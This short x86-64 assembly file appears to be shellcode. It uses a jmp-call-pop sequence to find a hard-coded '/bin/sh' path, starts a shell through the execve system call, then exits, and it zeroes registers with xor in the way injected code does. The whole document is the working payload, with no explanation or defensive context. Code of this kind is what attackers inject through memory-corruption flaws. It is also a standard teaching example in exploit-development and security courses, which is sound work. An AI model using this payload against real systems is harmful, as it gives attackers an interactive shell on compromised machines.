.section .text
.globl _start
_start:
	movq %rsp,%rbp
	pushq %rbx
	jmp Temp
Cont:
	popq %rbx
	movq %rbx,%rdi		#pointer to hard coded shell path
	xorq %rax,%rax
	movb $59,%al
	xorq %rsi,%rsi
	movq %rsi,%rdx
	syscall
	movq %rax, %rbx
	movb $60, %al	
	xorq %rdi, %rdi
	syscall
Temp:
	call Cont
Path: 
.ascii "/bin/sh\0"

